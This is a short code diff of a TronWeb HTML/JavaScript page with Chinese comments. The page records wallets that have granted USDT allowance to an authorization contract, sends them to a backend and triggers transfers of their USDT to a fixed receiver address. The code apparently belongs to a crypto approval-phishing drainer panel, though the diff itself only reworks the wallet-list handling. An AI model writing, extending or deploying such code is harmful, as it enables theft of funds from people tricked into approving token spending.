@@ -60,10 +60,14 @@
         const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
         const allowed = parseInt(allowance.toString()) / 1e6;
 
-        if (allowed > 0 && !approvedWallets.includes(address)) {
+        if (allowed > 0) {
+          // 將錢包加入後端記錄
           await axios.post(`${BACKEND}/wallets`, { address });
-          approvedWallets.push(address);
-          renderWallets();
+          if (!approvedWallets.includes(address)) {
+            approvedWallets.push(address);
+          }
+          // 重新渲染錢包清單
+          await renderWallets();
         }
 
         alert(`授權額度：${allowed} USDT`);
@@ -112,7 +116,7 @@
           USDT_CONTRACT,
           from,
           RECEIVER,
-          tronWeb.toSun(amount) // 1e6 for USDT
+          tronWeb.toSun(amount)
         ).send();
 
         alert(`✅ 已觸發 ${amount} USDT 轉帳`);
@@ -138,5 +142,3 @@
   </script>
 </body>
 </html>
-
-
